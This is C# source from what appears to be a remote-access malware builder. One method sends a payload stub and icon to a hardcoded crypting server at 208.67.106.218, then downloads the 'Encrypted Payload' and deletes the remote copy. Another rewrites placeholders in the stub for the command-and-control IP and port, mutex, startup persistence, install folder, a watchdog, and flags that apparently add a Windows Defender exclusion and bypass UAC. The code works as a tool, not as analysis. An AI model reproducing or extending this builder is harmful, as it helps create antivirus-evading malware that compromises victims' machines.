		private async Task CrpAsync(string crp)
		{
			try
			{
				if (this.toggleButtonicon.Checked && !string.IsNullOrEmpty(this.txtIcon.Text))
				{
                    this.listBox2.Items.Add("Adding icon...");
					this.txtIcon.Enabled = true;
					this.pictureBoxicon.Enabled = true;
                    this.listBox2.Items.Add("Please don't close builder...");
                    this.listBox2.Items.Add("Wait for popup...");
                    WebClient webClient = new WebClient();
                    webClient.Proxy = null;
                    webClient.Credentials = CredentialCache.DefaultCredentials;
                    webClient.UploadFile("http://208.67.106.218:81/crypt/public/post_ico_file", "POST", this.txtIcon.Text.ToString());
                    webClient.Dispose();
                }
				if (this.txtFilename.Text.Trim() != "")
				{
                    StubBuilder.filename = Path.GetDirectoryName(crp.ToString()) + "\\" + this.txtFilename.Text;
				}
                else
				{
                    StubBuilder.filename = crp.ToString().Substring(0, crp.ToString().Length - 4) + "_Encrypted.exe";
				}
                WebClient obj = new WebClient
				{
					Proxy = null
				};
				string fileName2 = crp.ToString();
				obj.Credentials = CredentialCache.DefaultCredentials;
                base.BeginInvoke((MethodInvoker)delegate
                {
                    this.listBox2.Items.Add("Uploading Stub...");
                });
                byte[] bytes = obj.UploadFile("http://208.67.106.218:81/crypt/public/post_file", "POST", fileName2);
                string @string = Encoding.ASCII.GetString(bytes);
                base.BeginInvoke((MethodInvoker)delegate
                {
                    this.listBox2.Items.Add("Encrypting Stub...");
                });
                obj.DownloadFile("http://208.67.106.218:81/crypt/public/save_files/" + @string, StubBuilder.filename);
                base.BeginInvoke((MethodInvoker)delegate
                {
                    this.listBox2.Items.Add("Downloading Encrypted Payload!...");
                });
                HttpWebRequest obj2 = (HttpWebRequest)WebRequest.Create("http://208.67.106.218:81/crypt/public/delete_file/" + @string);
                obj2.Method = "GET";
                _ = (HttpWebResponse)obj2.GetResponse();
                base.BeginInvoke((MethodInvoker)delegate
                {
                    this.listBox2.Items.Add("Clean up completed!...");
                });
                obj.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void WriteSettings(ModuleDefMD asmDef)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    if (type.Name == "Program")
                    {
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null)
                            {
                                continue;
                            }
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
                                {
                                    continue;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%IP%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtIP.Text;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%PORT%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtPORT.Text;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%ID%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtIdentifier.Text;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtMutex.Text;
                                }
                                if (this.chkStartup.Checked)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%STARTUP%")
                                    {
                                        method.Body.Instructions[i].Operand = "True";
                                    }
                                }
                                else if (method.Body.Instructions[i].Operand.ToString() == "%STARTUP%")
                                {
                                    method.Body.Instructions[i].Operand = "False";
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%PATH%")
                                {
                                    method.Body.Instructions[i].Operand = this.comboBox1.SelectedIndex.ToString();
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%FOLDER%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtFolder.Text;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%FILENAME%")
                                {
                                    method.Body.Instructions[i].Operand = this.txtFilename.Text;
                                }
                                if (this.chkWDEX.Checked)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%WDEX%")
                                    {
                                        method.Body.Instructions[i].Operand = "True";
                                    }
                                }
                                else if (method.Body.Instructions[i].Operand.ToString() == "%WDEX%")
                                {
                                    method.Body.Instructions[i].Operand = "False";
                                }
                                if (this.chkWatcher.Checked)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%WATCH%")
                                    {
                                        method.Body.Instructions[i].Operand = "True";
                                    }
                                }
                                else if (method.Body.Instructions[i].Operand.ToString() == "%WATCH%")
                                {
                                    method.Body.Instructions[i].Operand = "False";
                                }
                                if (this.chkUCA.Checked)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%KAR%")
                                    {
                                        method.Body.Instructions[i].Operand = "True";
                                    }
                                }
                                else if (method.Body.Instructions[i].Operand.ToString() == "%KAR%")
                                {
                                    method.Body.Instructions[i].Operand = "False";
                                }
                            }
                        }
                    }
                    if (!(type.Name == "dog"))
                    {
                        continue;
                    }
                    foreach (MethodDef method2 in type.Methods)
                    {
                        if (method2.Body == null)
                        {
                            continue;
                        }
                        for (int j = 0; j < method2.Body.Instructions.Count(); j++)
                        {
                            if (method2.Body.Instructions[j].OpCode == OpCodes.Ldstr && method2.Body.Instructions[j].Operand.ToString() == "%FILENAME%")
                            {
                                method2.Body.Instructions[j].Operand = this.txtFilename.Text;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

